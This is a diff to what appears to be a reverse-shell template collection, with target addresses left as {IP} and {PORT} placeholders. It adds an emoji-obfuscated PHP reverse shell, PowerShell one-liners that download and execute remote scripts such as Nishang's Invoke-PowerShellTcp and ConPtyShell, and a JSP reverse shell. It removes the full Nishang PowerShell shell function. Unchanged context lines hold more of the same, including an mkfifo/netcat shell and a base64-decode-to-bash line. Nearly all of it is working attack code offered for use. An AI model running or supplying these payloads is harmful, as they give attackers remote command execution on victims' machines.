@@ -290,6 +290,27 @@ function printit ($string) {
 
 #EXAMPLE
 
+{PHPEMOJI}
+<?php
+#Reverse shell 
+$😀="1";$😁="2";$😅="3";$😆="4";$😉="5";$😊="6";$😎="7";$😍="8";$😚="9";
+$🙂="0";$🤢=" ";$🤓="<";$🤠=">";$😱="-";$😵="&";$🤩="i";$🤔=".";$🤨="/";
+$🥰="a";$😐="b";$😶="i";$🙄="h";$😂="c";$🤣="d";$😃="e";$😄="f";$😋="k";
+$😘="n";$😗="o";$😙="p";$🤗="s";$😑="x";
+$💀 = $😄. $🤗. $😗. $😂. $😋. $😗. $😙. $😃. $😘;
+#IP Address
+$🚀 = {IP};
+#Port Number
+$💻 = {PORT};
+$🐚 = $🤨. $😐. $😶. $😘. $🤨. $😐. $🥰. $🤗. $🙄. $🤢. $😱. $🤩. $🤢. $🤓. $😵. $😅. $🤢. $🤠. $😵. $😅. $🤢. $😁. $🤠. $😵. $😅;
+$🤣 =  $💀($🚀,$💻);
+$👽 = $😃. $😑. $😃. $😂;
+$👽($🐚);
+?> 
+
+
+#EXAMPLE
+
 <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f'); ?>
 
 #EXAMPLE
@@ -384,123 +405,28 @@ $client = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$stream = $clie
 
 #EXAMPLE
 
-function Invoke-PowerShellTcp 
-{ 
-<#
-.SYNOPSIS
-Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 
-.DESCRIPTION
-This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
-Also, a standard netcat can connect to this script Bind to a specific port.
-The script is derived from Powerfun written by Ben Turner & Dave Hardy
-.PARAMETER IPAddress
-The IP address to connect to when using the -Reverse switch.
-.PARAMETER Port
-The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
-.EXAMPLE
-PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
-Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
-the given IP and port. 
-.EXAMPLE
-PS > Invoke-PowerShellTcp -Bind -Port 4444
-Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 
-.EXAMPLE
-PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
-Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
-listening on the given IP and port. 
-.LINK
-http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
-https://github.com/nettitude/powershell/blob/master/powerfun.ps1
-https://github.com/samratashok/nishang
-#>      
-    [CmdletBinding(DefaultParameterSetName="reverse")] Param(
+#References => https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
 
-        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
-        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
-        [String]
-        $IPAddress,
+powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://{IP}/shell.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {IP} -Port {PORT}"
 
-        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
-        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
-        [Int]
-        $Port,
 
-        [Parameter(ParameterSetName="reverse")]
-        [Switch]
-        $Reverse,
+#EXAMPLE
 
-        [Parameter(ParameterSetName="bind")]
-        [Switch]
-        $Bind
+powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://{IP}/shell.ps1')"
 
-    )
+#EXAMPLE
 
-    
-    try 
-    {
-        #Connect back if the reverse switch is used.
-        if ($Reverse)
-        {
-            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
-        }
+#References => https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1
 
-        #Bind to the provided port if Bind switch is used.
-        if ($Bind)
-        {
-            $listener = [System.Net.Sockets.TcpListener]$Port
-            $listener.start()    
-            $client = $listener.AcceptTcpClient()
-        } 
+powershell.exe "IEX(IWR http://{IP}/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {IP} {PORT}"
 
-        $stream = $client.GetStream()
-        [byte[]]$bytes = 0..65535|%{0}
+#EXAMPLE
 
-        #Send back current username and computername
-        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
-        $stream.Write($sendbytes,0,$sendbytes.Length)
+powershell.exe "iex(iwr -usebasicparsing http://{IP}/shell.ps1)"
 
-        #Show an interactive PowerShell prompt
-        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
-        $stream.Write($sendbytes,0,$sendbytes.Length)
+#EXAMPLE
 
-        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
-        {
-            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
-            $data = $EncodedText.GetString($bytes,0, $i)
-            try
-            {
-                #Execute the command on the target.
-                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
-            }
-            catch
-            {
-                Write-Warning "Something went wrong with execution of command on the target." 
-                Write-Error $_
-            }
-            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
-            $x = ($error[0] | Out-String)
-            $error.clear()
-            $sendback2 = $sendback2 + $x
-
-            #Return the results
-            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
-            $stream.Write($sendbyte,0,$sendbyte.Length)
-            $stream.Flush()  
-        }
-        $client.Close()
-        if ($listener)
-        {
-            $listener.Stop()
-        }
-    }
-    catch
-    {
-        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
-        Write-Error $_
-    }
-}
-
-Invoke-PowerShellTcp -Reverse -IPAddress {IP} -Port {PORT}
+powershell.exe -e {BASE64PS1}
 
 #INDEX
 
@@ -1173,9 +1099,58 @@ echo {BASE64} | base64 -d | bash
 </root>                                                                                                                 
 
 
+#INDEX
 
+#EXAMPLE
 
+#Msfvenom => msfvenom -p java/jsp_shell_reverse_tcp LHOST={IP} LPORT={PORT} -f raw > shell.jsp
 
-
-
-
+<%@page import="java.lang.*"%>
+<%@page import="java.util.*"%>
+<%@page import="java.io.*"%>
+<%@page import="java.net.*"%>
+  class StreamConnector extends Thread
+    InputStream zl;
+    OutputStream kh;
+    StreamConnector( InputStream zl, OutputStream kh )
+    {
+      this.zl = zl;
+      this.kh = kh;
+    }
+    public void run()
+    {
+      BufferedReader eo  = null;
+      BufferedWriter iqz = null;
+      try
+      {
+        eo  = new BufferedReader( new InputStreamReader( this.zl ) );
+        iqz = new BufferedWriter( new OutputStreamWriter( this.kh ) );
+        char buffer[] = new char[8192];
+        int length;
+        while( ( length = eo.read( buffer, 0, buffer.length ) ) > 0 )
+        {
+          iqz.write( buffer, 0, length );
+          iqz.flush();
+        }
+      } catch( Exception e ){}
+      try
+      {
+        if( eo != null )
+          eo.close();
+        if( iqz != null )
+          iqz.close();
+      } catch( Exception e ){}
+    }
+  try
+    String ShellPath;
+if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
+  ShellPath = new String("/bin/sh");
+} else {
+  ShellPath = new String("cmd.exe");
+    Socket socket = new Socket( "{IP}", {PORT} );
+    Process process = Runtime.getRuntime().exec( ShellPath );
+    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
+    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
+  } catch( Exception e ) {}
+   
+                                                                                                                           
